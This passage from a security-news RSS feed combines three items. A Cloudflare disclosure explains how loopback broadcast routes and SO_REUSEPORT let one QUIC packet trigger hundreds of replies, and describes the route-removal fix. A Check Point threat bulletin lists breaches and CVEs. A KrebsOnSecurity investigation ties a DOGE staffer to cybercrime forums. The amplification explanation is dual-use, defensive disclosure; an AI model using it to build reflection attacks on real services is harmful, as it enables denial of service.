        &lt;p&gt;To combat the risk posed by broadcast addresses, by default most routers reject packets originating from outside their IP subnet which are targeted at the broadcast address of networks for which they are locally connected. Broadcast packets are only allowed to be forwarded within the same IP subnet, preventing attacks from the Internet from targeting servers across the world.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5TU3GO26KOJgzLHcS9Uxiu/6cd334afc3925b1713b7e706decc7269/image1.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;The same techniques are not generally applied when a given router is not directly connected to a given subnet. So long as an address is not locally treated as a broadcast address, &lt;a href="https://www.cloudflare.com/learning/security/glossary/what-is-bgp/"&gt;&lt;u&gt;Border Gateway Protocol&lt;/u&gt;&lt;/a&gt; (BGP) or other routing protocols will continue to route traffic from external IPs toward the last IPv4 address in a subnet. Essentially, this means a “broadcast address” is only relevant within a local scope of routers and hosts connected together via Ethernet. To routers and hosts across the Internet, a broadcast IP address is routed in the same way as any other IP.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Binding IP address ranges to hosts&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#binding-ip-address-ranges-to-hosts"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Each Cloudflare server is expected to be capable of serving content from every website on the Cloudflare network. Because our network utilizes &lt;a href="https://www.cloudflare.com/learning/cdn/glossary/anycast-network/"&gt;&lt;u&gt;Anycast&lt;/u&gt;&lt;/a&gt; routing, each server necessarily needs to be listening on (and capable of returning traffic from) every Anycast IP address in use on our network.&lt;/p&gt;&lt;p&gt;To do so, we take advantage of the loopback interface on each server. Unlike a physical network interface, all IP addresses within a given IP address range are made available to the host (and will be processed locally by the kernel) when bound to the loopback interface.&lt;/p&gt;&lt;p&gt;The mechanism by which this works is straightforward. In a traditional routing environment, &lt;a href="https://en.wikipedia.org/wiki/Longest_prefix_match"&gt;&lt;u&gt;longest prefix matching&lt;/u&gt;&lt;/a&gt; is employed to select a route. Under longest prefix matching, routes towards more specific blocks of IP addresses (such as 192.0.2.96/29, a range of 8 addresses) will be selected over routes to less specific blocks of IP addresses (such as 192.0.2.0/24, a range of 256 addresses).&lt;/p&gt;&lt;p&gt;While Linux utilizes longest prefix matching, it consults an additional step — the Routing Policy Database (RPDB) — before immediately searching for a match. The RPDB contains a list of routing tables which can contain routing information and their individual priorities. The default RPDB looks like this:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;$ ip rule show
0:	from all lookup local
32766:	from all lookup main
32767:	from all lookup default&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;Linux will consult each routing table in ascending numerical order to try and find a matching route. Once one is found, the search is terminated and the route immediately used.&lt;/p&gt;&lt;p&gt;If you’ve previously worked with routing rules on Linux, you are likely familiar with the contents of the main table. Contrary to the existence of the table named “default”, “main” generally functions as the default lookup table. It is also the one which contains what we traditionally associate with route table information:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;$ ip route show table main
default via 192.0.2.1 dev eth0 onlink
192.0.2.0/24 dev eth0 proto kernel scope link src 192.0.2.2&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;This is, however, not the first routing table that will be consulted for a given lookup. Instead, that task falls to the local table:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;$ ip route show table local
local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1
local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1
broadcast 127.255.255.255 dev lo proto kernel scope link src 127.0.0.1
local 192.0.2.2 dev eth0 proto kernel scope host src 192.0.2.2
broadcast 192.0.2.255 dev eth0 proto kernel scope link src 192.0.2.2&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;Looking at the table, we see two new types of routes — local and broadcast. As their names would suggest, these routes dictate two distinctly different functions: routes that are handled locally and routes that will result in a packet being broadcast. Local routes provide the desired functionality — any prefix with a local route will have all IP addresses in the range processed by the kernel. Broadcast routes will result in a packet being broadcast to all IP addresses within the given range. Both types of routes are added automatically when an IP address is bound to an interface (and, when a range is bound to the loopback (lo) interface, the range itself will be added as a local route).&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Vulnerability discovery&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#vulnerability-discovery"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Deployments of QUIC are highly dependent on the load-balancing and packet forwarding infrastructure that they sit on top of. Although QUIC’s RFCs describe risks and mitigations, there can still be attack vectors depending on the nature of server deployments. The reporting researchers studied QUIC deployments across the Internet and discovered that sending a QUIC Initial packet to one of Cloudflare’s broadcast addresses triggered a flood of responses. The aggregate amount of response data exceeded the RFC's 3x amplification limit.&lt;/p&gt;&lt;p&gt;Taking a look at the local routing table of an example Cloudflare system, we see a potential culprit:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;$ ip route show table local
local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1
local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1
broadcast 127.255.255.255 dev lo proto kernel scope link src 127.0.0.1
local 192.0.2.2 dev eth0 proto kernel scope host src 192.0.2.2
broadcast 192.0.2.255 dev eth0 proto kernel scope link src 192.0.2.2
local 203.0.113.0 dev lo proto kernel scope host src 203.0.113.0
local 203.0.113.0/24 dev lo proto kernel scope host src 203.0.113.0
broadcast 203.0.113.255 dev lo proto kernel scope link src 203.0.113.0&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;On this example system, the anycast prefix 203.0.113.0/24 has been bound to the loopback interface (lo) through the use of standard tooling. Acting dutifully under the standards of IPv4, the tooling has assigned both special types of routes — a local one for the IP range itself and a broadcast one for the final address in the range — to the interface.&lt;/p&gt;&lt;p&gt;While traffic to the broadcast address of our router’s directly connected subnet is filtered as expected, broadcast traffic targeting our routed anycast prefixes still arrives at our servers themselves. Normally, broadcast traffic arriving at the loopback interface does little to cause problems. Services bound to a specific port across an entire range will receive data sent to the broadcast address and continue as normal. Unfortunately, this relatively simple trait breaks down when normal expectations are broken.&lt;/p&gt;&lt;p&gt;Cloudflare’s frontend consists of several worker processes, each of which independently binds to the entire anycast range on UDP port 443. In order to enable multiple processes to bind to the same port, we use the SO_REUSEPORT socket option. While SO_REUSEPORT &lt;a href="https://blog.cloudflare.com/the-sad-state-of-linux-socket-balancing/"&gt;&lt;u&gt;has additional benefits&lt;/u&gt;&lt;/a&gt;, it also causes traffic sent to the broadcast address to be copied to every listener.&lt;/p&gt;&lt;p&gt;Each individual QUIC server worker operates in isolation. Each one reacted to the same client Initial, duplicating the work on the server side and generating response traffic to the client's IP address. Thus, a single packet could trigger a significant amplification. While specifics will vary by implementation, a typical one-listener-per-core stack (which sends retries in response to presumed timeouts) on a 128-core system could result in 384 replies being generated and sent for each packet sent to the broadcast address.&lt;/p&gt;&lt;p&gt;Although the researchers demonstrated this attack on QUIC, the underlying vulnerability can affect other UDP request/response protocols that use sockets in the same way.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Mitigation&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#mitigation"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;As a communication methodology, broadcast is not generally desirable for anycast prefixes. Thus, the easiest method to mitigate the issue was simply to disable broadcast functionality for the final address in each range.&lt;/p&gt;&lt;p&gt;Ideally, this would be done by modifying our tooling to only add the local routes in the local routing table, skipping the inclusion of the broadcast ones altogether. Unfortunately, the only practical mechanism to do so would involve patching and maintaining our own internal fork of the iproute2 suite, a rather heavy-handed solution for the problem at hand.&lt;/p&gt;&lt;p&gt;Instead, we decided to focus on removing the route itself. Similar to any other route, it can be removed using standard tooling:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;$ sudo ip route del 203.0.113.255 table local&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;To do so at scale, we made a relatively minor change to our deployment system:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;  {%- for lo_route in lo_routes %}
    {%- if lo_route.type == "broadcast" %}
        # All broadcast addresses are implicitly ipv4
        {%- do remove_route({
        "dev": "lo",
        "dst": lo_route.dst,
        "type": "broadcast",
        "src": lo_route.src,
        }) %}
    {%- endif %}
  {%- endfor %}&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;In doing so, we effectively ensure that all broadcast routes attached to the loopback interface are removed, mitigating the risk by ensuring that the specification-defined broadcast address is treated no differently than any other address in the range.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Next steps &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#next-steps"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;While the vulnerability specifically affected broadcast addresses within our anycast range, it likely expands past our infrastructure. Anyone with infrastructure that meets the relatively narrow criteria (a multi-worker, multi-listener UDP-based service that is bound to all IP addresses on a machine with routable IP prefixes attached in such a way as to expose the broadcast address) will be affected unless mitigations are in place. We encourage network administrators and security professionals to assess their systems for configurations that may present a local amplification attack vector.&lt;/p&gt;</content:encoded><guid isPermaLink="false">6ZaxgQxDACeIF6MZAquLPV</guid><category>Security</category><category>Network</category><category>Edge</category><category>DDoS</category><category>HTTP3</category><category>Bug Bounty</category></item><item><title>10th February – Threat Intelligence Report</title><link>https://research.checkpoint.com/2025/10th-february-threat-intelligence-report/</link><description>&lt;p&gt;For the latest discoveries in cyber research for the week of 10th February, please download our Threat Intelligence Bulletin.

&lt;li&gt;Grubhub, the US-based online food ordering and delivery platform, &lt;a href="https://about.grubhub.com/news/our-response-to-a-third-party-vendor-incident/"&gt;suffered&lt;/a&gt; a data breach due to unauthorized access through a compromised third-party service provider’s account. The incident exposed personal details of customers, drivers, and merchants, including names, email addresses, phone numbers, payment card types, last four digits of card numbers, and hashed passwords for certain legacy systems. Grubhub has since revoked the service provider’s access and launched an investigation into the incident.&lt;/li&gt;
&lt;li&gt;The city of McKinney, Texas, &lt;a href="https://www.mckinneytexas.org/CivicAlerts.aspx?AID=6072"&gt;notified&lt;/a&gt; about a cyber-attack it experienced on October 31, 2024, which was detected on November 14. The breach exposed sensitive information, including names, addresses, Social Security numbers, driver&amp;#8217;s license numbers, credit card details, financial account data, and medical insurance information of approximately 17,751 residents. The city has notified affected individuals and is offering one year of identity protection services.&lt;/li&gt;

The incident impacted all online applications, including email platforms and systems used for classwork, leading to the cancellation of online classes. The university is collaborating with law enforcement to contain the incident and has urged students to change their passwords.&lt;/li&gt;
&lt;li&gt;British engineering company IMI has &lt;a href="https://otp.tools.investis.com/clients/uk/imi_plc4/rns/regulatory-story.aspx?cid=293&amp;amp;newsid=1907192"&gt;fallen&lt;/a&gt; victim to a cyber-attack which resulted in unauthorized access to its systems. Upon detection, the company engaged external cybersecurity experts to investigate and contain the incident. This event follows a similar cyber-attack reported by another UK-based engineering firm, Smiths Group, nine days earlier.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Trimble has &lt;a href="https://learn.assetlifecycle.trimble.com/i/1532182-cityworks-customer-communication-2025-02-06-docx/0"&gt;disclosed&lt;/a&gt; that a deserialization vulnerability in its Cityworks software, identified as CVE-2025-0994 with a CVSS v4.0 score of 8.6, is being actively exploited. This flaw allows authenticated users to execute remote code on Microsoft Internet Information Services (IIS) servers, leading to unauthorized access and deployment of Cobalt Strike beacons. Cityworks is widely used by local governments and utilities for asset and work order management. Trimble advises users to update to version 15.8.9 or later to mitigate this risk.&lt;/li&gt;
&lt;li&gt;Cisco has &lt;a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ise-multivuls-FTW9AOXF"&gt;published&lt;/a&gt; an advisory addressing two critical vulnerabilities in Cisco Identity Services Engine (ISE). The vulnerabilities, CVE-2025-20124 (CVSS 9.9) and CVE-2025-20125 (CVSS 9.1), allow remote attackers to gain escalation privilege and execute arbitrary commands on affected devices.&lt;/li&gt;
&lt;li&gt;A high-severity kernel flaw actively exploited in Android devices was &lt;a href="https://www.bitdefender.com/en-us/blog/hotforsecurity/google-includes-critical-android-kernel-patch-in-february-security-update"&gt;patched&lt;/a&gt; by Google in its latest security update. This Linux kernel vulnerability, identified as CVE-2024-53104 (USB video-class driver code), potentially allows several types of attacks through a buffer overflow, triggered by parsing undefined video frames. The latest patch aims to mitigate this by skipping parsing of problematic frames.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point Research has &lt;a href="https://blog.checkpoint.com/artificial-intelligence/cpr-finds-threat-actors-already-leveraging-deepseek-and-qwen-to-develop-malicious-content/"&gt;identified&lt;/a&gt; that threat actors are leveraging AI models like DeepSeek and Qwen to generate malicious content. These models have been manipulated to assist in developing infostealer malware, bypassing anti-fraud protections, and optimizing spam distribution techniques. Researchers observed cybercriminals using &amp;#8220;jailbreaking&amp;#8221; methods to override built-in security restrictions, allowing the creation of harmful tools.&lt;/li&gt;
&lt;li&gt;Check Point has &lt;a href="https://blog.checkpoint.com/security/new-facebook-copyright-infringement-phishing-campaign/"&gt;reported&lt;/a&gt; a phishing campaign impersonating Facebook, falsely notifying recipients of copyright infringement. The emails, sent from Salesforce&amp;#8217;s automated mailing service, direct users to a fake Facebook support page to harvest credentials. The campaign began around December 20, 2024, primarily affecting enterprises across the EU (45.5%), US (45.0%), and Australia (9.5%), with versions in Chinese and Arabic, indicating a broad geographic target.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://www.trendmicro.com/en_us/research/25/a/cve-2025-0411-ukrainian-organizations-targeted.html"&gt;uncovered&lt;/a&gt; an ongoing cyber campaign where Russian threat actors are deploying SmokeLoader malware against Ukrainian government and private sector organizations. The attackers use phishing emails impersonating Ukrainian agencies and businesses, embedding malicious attachments that exploit vulnerabilities to deliver SmokeLoader. This malware, traditionally used for financially motivated attacks, is now being leveraged in cyber-espionage operations against Ukrainian critical infrastructure.&lt;/li&gt;

As today&amp;#8217;s story explores, the DOGE teen is a former denizen of &amp;#8216;&lt;strong&gt;The Com&lt;/strong&gt;,&amp;#8217; an archipelago of Discord and Telegram chat channels that function as a kind of distributed cybercriminal social network for facilitating instant collaboration.&lt;/p&gt;
&lt;p&gt;Since President Trump&amp;#8217;s second inauguration, Musk&amp;#8217;s DOGE team has gained access to a truly staggering amount of personal and sensitive data on American citizens, moving quickly to seize control over databases at the &lt;strong&gt;U.S. Treasury&lt;/strong&gt;, the &lt;strong&gt;Office of Personnel Management&lt;/strong&gt;, the &lt;strong&gt;Department of Education&lt;/strong&gt;, and the &lt;strong&gt;Department of Health and Human Resources&lt;/strong&gt;, among others.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Wired&lt;/em&gt; first &lt;a href="https://archive.ph/HCCA4" rel="noopener" target="_blank"&gt;reported on Feb. 2&lt;/a&gt; that one of the technologists on Musk&amp;#8217;s crew is a 19-year-old high school graduate named &lt;strong&gt;Edward Coristine&lt;/strong&gt;, who reportedly goes by the nickname &amp;#8220;Big Balls&amp;#8221; online. One of the companies Coristine founded, &lt;strong&gt;Tesla.Sexy LLC&lt;/strong&gt;, was set up in 2021, when he would have been around 16 years old.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Tesla.Sexy LLC controls dozens of web domains, including at least two Russian-registered domains,&amp;#8221; &lt;em&gt;Wired&lt;/em&gt; reported. &amp;#8220;One of those domains, which is still active, offers a service called Helfie, which is an AI bot for Discord servers targeting the Russian market. While the operation of a Russian website would not violate US sanctions preventing Americans doing business with Russian companies, it could potentially be a factor in a security clearance review.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Mr. Coristine has not responded to requests for comment. In &lt;a href="https://archive.ph/VAD48" rel="noopener" target="_blank"&gt;a follow-up story&lt;/a&gt; this week, &lt;em&gt;Wired&lt;/em&gt; found that someone using a Telegram handle tied to Coristine solicited a DDoS-for-hire service in 2022, and that he worked for a short time at a company that specializes in protecting customers from DDoS attacks.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70369" style="width: 647px;"&gt;&lt;img alt="" class="size-full wp-image-70369" height="636" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/coristine.png" width="637" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70369"&gt;A profile photo from Coristine&amp;#8217;s WhatsApp account.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Internet routing records &lt;a href="https://bgp.he.net/net/23.133.104.0/24#_whois" rel="noopener" target="_blank"&gt;show&lt;/a&gt; that Coristine runs an Internet service provider called &lt;strong&gt;Packetware&lt;/strong&gt; (AS400495). Also known as &amp;#8220;&lt;strong&gt;DiamondCDN&lt;/strong&gt;,&amp;#8221; Packetware &lt;a href="https://bgp.he.net/net/23.133.104.0/24#_dnsrecords" rel="noopener" target="_blank"&gt;currently hosts&lt;/a&gt; tesla[.]sexy and diamondcdn[.]com, among other domains.&lt;/p&gt;
&lt;p&gt;DiamondCDN was advertised and claimed by someone who used the nickname &amp;#8220;&lt;strong&gt;Rivage&lt;/strong&gt;&amp;#8221; on several Com-based Discord channels over the years. A review of chat logs from some of those channels show other members frequently referred to Rivage as &amp;#8220;Edward.&amp;#8221;&lt;/p&gt;
&lt;p&gt;From late 2020 to late 2024, Rivage&amp;#8217;s conversations would show up in multiple Com chat servers that are closely monitored by security companies. In November 2022, Rivage could be seen requesting recommendations for a reliable and powerful DDoS-for-hire service.&lt;/p&gt;
&lt;p&gt;Rivage made that request in the cybercrime channel &amp;#8220;&lt;strong&gt;Dstat&lt;/strong&gt;,&amp;#8221; a core Com hub where users could buy and sell attack services. &lt;a href="https://www.bleepingcomputer.com/news/security/ddos-site-dstatcc-seized-and-two-suspects-arrested-in-germany/" rel="noopener" target="_blank"&gt;Dstat’s website dstat[.]cc was seized&lt;/a&gt; in 2024 as part of “Operation PowerOFF,” an international law enforcement action against DDoS services.&lt;/p&gt;
&lt;p&gt;Coristine&amp;#8217;s LinkedIn profile said that in 2022 he worked at an anti-DDoS company called &lt;strong&gt;Path Networks&lt;/strong&gt;, which &lt;em&gt;Wired&lt;/em&gt; generously described as a &amp;#8220;network monitoring firm known for hiring reformed blackhat hackers.&amp;#8221; &lt;em&gt;Wired&lt;/em&gt; wrote:&lt;/p&gt;
&lt;p&gt;&amp;#8220;At Path Network, Coristine worked as a systems engineer from April to June of 2022, according to his now-deleted LinkedIn résumé. Path has at times listed as employees &lt;strong&gt;Eric Taylor&lt;/strong&gt;, also known as Cosmo the God, a well-known former cybercriminal and member of the hacker group UGNazis, as well as Matthew Flannery, an Australian convicted hacker whom police allege was a member of the hacker group LulzSec. It’s unclear whether Coristine worked at Path concurrently with those hackers, and WIRED found no evidence that either Coristine or other Path employees engaged in illegal activity while at the company.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The founder of Path is a young man named &lt;strong&gt;Marshal Webb&lt;/strong&gt;. I wrote about Webb back in 2016, in a story about a DDoS defense company he co-founded called &lt;strong&gt;BackConnect Security LLC&lt;/strong&gt;. On September 20, 2016, KrebsOnSecurity published data showing that the company &lt;a href="https://krebsonsecurity.com/2016/09/ddos-mitigation-firm-has-history-of-hijacks/" rel="noopener" target="_blank"&gt;had a history of hijacking Internet address space that belonged to others&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Less than 24 hours after that story ran, KrebsOnSecurity.com was &lt;a href="https://krebsonsecurity.com/2016/09/krebsonsecurity-hit-with-record-ddos/" rel="noopener" target="_blank"&gt;hit with the biggest DDoS attack the Internet had ever seen at the time&lt;/a&gt;. That sustained attack &lt;a href="https://krebsonsecurity.com/2016/09/the-democratization-of-censorship/" rel="noopener" target="_blank"&gt;kept this site offline for nearly 4 days&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The other founder of BackConnect Security LLC was &lt;strong&gt;Tucker Preston&lt;/strong&gt;, a Georgia man who &lt;a href="https://krebsonsecurity.com/2020/01/ddos-mitigation-firm-founder-admits-to-ddos/" rel="noopener" target="_blank"&gt;pleaded guilty in 2020&lt;/a&gt; to paying a DDoS-for-hire service to launch attacks against others.&lt;/p&gt;
&lt;p&gt;The aforementioned Path employee Eric Taylor &lt;a href="https://krebsonsecurity.com/2017/02/men-who-sent-swat-team-heroin-to-my-home-sentenced/" rel="noopener" target="_blank"&gt;pleaded guilty in 2017&lt;/a&gt; to charges including &lt;a href="http://krebsonsecurity.com/2013/03/the-world-has-no-room-for-cowards/" rel="noopener" target="_blank"&gt;an attack on our home in 2013&lt;/a&gt;. Taylor was among several men involved in making a false report to my local police department about a supposed hostage situation at our residence in Virginia. In response, a heavily-armed police force surrounded my home and put me in handcuffs at gunpoint before the police realized it was all a dangerous hoax known as &amp;#8220;swatting.&amp;#8221;&lt;/p&gt;
&lt;p&gt;CosmoTheGod rocketed to Internet infamy in 2013 when he and a number of other hackers &lt;a href="https://krebsonsecurity.com/2013/03/credit-reports-sold-for-cheap-in-the-underweb/" rel="noopener" target="_blank"&gt;set up the Web site exposed[dot]su&lt;/a&gt;, which “doxed” dozens of public officials and celebrities by publishing the address, Social Security numbers and other personal information on the former First Lady Michelle Obama, the then-director of the FBI and the U.S. attorney general, among others. The group also swatted many of the people they doxed.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Wired&lt;/em&gt; noted that Coristine only worked at Path for a few months in 2022, but the story didn&amp;#8217;t mention why his tenure was so short. A screenshot shared on the website &lt;a href="https://www.pathtruths.com" rel="noopener" target="_blank"&gt;pathtruths.com&lt;/a&gt; includes a snippet of conversations in June 2022 between Path employees discussing Coristine&amp;#8217;s firing.&lt;/p&gt;
&lt;p&gt;According to that record, Path founder Marshal Webb dismissed Coristine for leaking internal documents to a competitor. Not long after Coristine&amp;#8217;s termination, someone leaked an abundance of internal Path documents and conversations. Among other things, those chats revealed that one of Path&amp;#8217;s technicians was a Canadian man named &lt;strong&gt;Curtis Gervais&lt;/strong&gt; who was convicted in 2017 of &lt;a href="https://krebsonsecurity.com/2017/09/canadian-man-gets-9-months-detention-for-serial-swattings-bomb-threats/" rel="noopener" target="_blank"&gt;perpetrating dozens of swatting attacks and fake bomb threats&lt;/a&gt; &amp;#8212; including at least two attempts against our home in 2014.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70370" style="width: 595px;"&gt;&lt;img alt="" class="size-full wp-image-70370" height="808" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/pathchat.png" width="585" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70370"&gt;A snippet of text from an internal Path chat room, wherein members discuss the reason for Coristine&amp;#8217;s termination: Allegedly, leaking internal company information. Source: Pathtruths.com.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;&lt;span id="more-70358"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;On May 11, 2024, Rivage posted on a Discord channel for a DDoS protection service that is chiefly marketed to members of The Com. Rivage expressed frustration with his time spent on Com-based communities, suggesting that its profitability had been oversold.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I don&amp;#8217;t think there&amp;#8217;s a lot of money to be made in the com,&amp;#8221; Rivage lamented. &amp;#8220;I&amp;#8217;m not buying Heztner [servers] to set up some com VPN.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Rivage largely stopped posting messages on Com channels after that. &lt;em&gt;Wired&lt;/em&gt; reports that Coristine subsequently spent three months last summer working at &lt;strong&gt;Neuralink&lt;/strong&gt;, Elon Musk&amp;#8217;s brain implant startup.&lt;/p&gt;
&lt;p&gt;The trouble with all this is that even if someone sincerely intends to exit The Com after years of consorting with cybercriminals, they are often still subject to personal attacks, harassment and hacking long after they have left the scene.&lt;/p&gt;
&lt;p&gt;That&amp;#8217;s because a huge part of Com culture involves harassing, swatting and hacking other members of the community. These internecine attacks are often for financial gain, but just as frequently they are perpetrated by cybercrime groups to exact retribution from or assert dominance over rival gangs.&lt;/p&gt;
&lt;p&gt;Experts say it is extremely difficult for former members of violent street gangs to gain a security clearance needed to view sensitive or classified information held by the U.S. government. That&amp;#8217;s because ex-gang members are highly susceptible to extortion and coercion from current members of the same gang, and that alone presents an unacceptable security risk for intelligence agencies.&lt;/p&gt;
&lt;p&gt;And make no mistake: The Com is the English-language cybercriminal hacking equivalent of a violent street gang. KrebsOnSecurity has published numerous stories detailing how feuds within the community &lt;a href="https://krebsonsecurity.com/2022/09/violence-as-a-service-brickings-firebombings-shootings-for-hire/" rel="noopener" target="_blank"&gt;periodically spill over into real-world violence&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;When Coristine&amp;#8217;s name surfaced in &lt;em&gt;Wired&lt;/em&gt;&amp;#8216;s report this week, members of The Com immediately took notice. In the following segment from a February 5, 2025 chat in a Com-affiliated hosting provider, members criticized Rivage&amp;#8217;s skills, and discussed harassing his family and notifying authorities about incriminating accusations that may or may not be true.&lt;/p&gt;

&lt;p&gt;Given the speed with which Musk&amp;#8217;s DOGE team was allowed access to such critical government databases, it strains credulity that Coristine could have been properly cleared beforehand. After all, he&amp;#8217;d recently been dismissed from a job &lt;em&gt;for allegedly leaking internal company information to outsiders&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;According to the national security adjudication &lt;a href="https://www.dni.gov/files/NCSC/documents/Regulations/SEAD-4-Adjudicative-Guidelines-U.pdf" rel="noopener" target="_blank"&gt;guidelines&lt;/a&gt; (PDF) released by the &lt;strong&gt;Director of National Intelligence&lt;/strong&gt; (DNI), eligibility determinations take into account a person&amp;#8217;s stability, trustworthiness, reliability, discretion, character, honesty, judgment, and ability to protect classified information.&lt;/p&gt;
&lt;p&gt;The DNI policy further states that &amp;#8220;eligibility for covered individuals shall be granted only when facts and circumstances indicate that eligibility is clearly consistent with the national security interests of the United States, and any doubt shall be resolved in favor of national security.&amp;#8221;&lt;/p&gt;
&lt;p&gt;On Thursday, 25-year-old DOGE staff member &lt;strong&gt;Marko Elez&lt;/strong&gt; resigned after being linked to a deleted social media account that advocated racism and eugenics. Elez resigned after &lt;em&gt;The Wall Street Journal&lt;/em&gt; &lt;a href="https://www.wsj.com/tech/doge-staffer-resigns-over-racist-posts-d9f11a93" rel="noopener" target="_blank"&gt;asked&lt;/a&gt; the White House about his connection to the account.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Just for the record, I was racist before it was cool,” the account posted in July. &amp;#8220;You could not pay me to marry outside of my ethnicity,” the account wrote on X in September. &amp;#8220;Normalize Indian hate,&amp;#8221; the account wrote the same month, in reference to a post noting the prevalence of people from India in Silicon Valley.&lt;/p&gt;
&lt;p&gt;Elez&amp;#8217;s resignation came a day after the Department of Justice agreed to limit the number of DOGE employees who have access to federal payment systems. The DOJ said access would be limited to two people, Elez and &lt;strong&gt;Tom Krause&lt;/strong&gt;, the CEO of a company called Cloud Software Group.&lt;/p&gt;
&lt;p&gt;Earlier today, Musk &lt;a href="https://thehill.com/business/5133430-elon-musk-doge-staffer-racist-posts/" rel="noopener" target="_blank"&gt;said he planned to rehire Elez&lt;/a&gt; after &lt;strong&gt;President Trump&lt;/strong&gt; and &lt;strong&gt;Vice President JD Vance&lt;/strong&gt; reportedly endorsed the idea. Speaking at The White House today, Trump said he wasn&amp;#8217;t concerned about the security of personal information and other data accessed by DOGE, adding that he was &amp;#8220;very proud of the job that this group of young people&amp;#8221; are doing.&lt;/p&gt;
&lt;p&gt;A White House official &lt;a href="https://www.reuters.com/world/us/staffer-with-elon-musks-doge-amplified-white-supremacists-online-2025-02-07/" rel="noopener" target="_blank"&gt;told&lt;/a&gt; &lt;em&gt;Reuters&lt;/em&gt; on Wednesday that Musk and his engineers have appropriate security clearances and are operating in &amp;#8220;full compliance with federal law, appropriate security clearances, and as employees of the relevant agencies, not as outside advisors or entities.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;NPR&lt;/em&gt; &lt;a href="https://www.npr.org/2025/02/07/nx-s1-5288988/doge-elon-musk-staff-trump" rel="noopener" target="_blank"&gt;reports&lt;/a&gt; Trump added that his administration&amp;#8217;s cost-cutting efforts would soon turn to the Education Department and the Pentagon, &amp;#8220;where he suggested without evidence that there could be &amp;#8216;trillions&amp;#8217; of dollars in wasted spending within the $6.75 trillion the federal government spent in fiscal year 2024.&amp;#8221;&lt;/p&gt;
&lt;p&gt;GOP leaders in the Republican-controlled House and Senate have largely shrugged about Musk&amp;#8217;s ongoing efforts to seize control over federal databases, dismantle agencies mandated by Congress, freeze federal spending on a range of already-appropriated government programs, and threaten workers with layoffs.&lt;/p&gt;
&lt;p&gt;Meanwhile, multiple parties have sued to stop DOGE&amp;#8217;s activities. ABC News &lt;a href="https://abcnews.go.com/US/judge-decide-block-doge-accessing-sensitive-labor-department/story?id=118575362" rel="noopener" target="_blank"&gt;says&lt;/a&gt; a federal judge was to rule today on whether DOGE should be blocked from accessing Department of Labor records, following a lawsuit alleging Musk&amp;#8217;s team sought to illegally access highly sensitive data, including medical information, from the federal government.&lt;/p&gt;
&lt;p&gt;At least 13 state attorneys general say they plan to file a lawsuit to stop DOGE from accessing federal payment systems containing Americans&amp;#8217; sensitive personal information, &lt;a href="https://www.mychamplainvalley.com/news/local-news/vermont-joins-lawsuit-over-doge-access-to-government-payment-system/" rel="noopener" target="_blank"&gt;reports&lt;/a&gt; &lt;em&gt;The Associated Press&lt;/em&gt;.&lt;/p&gt;
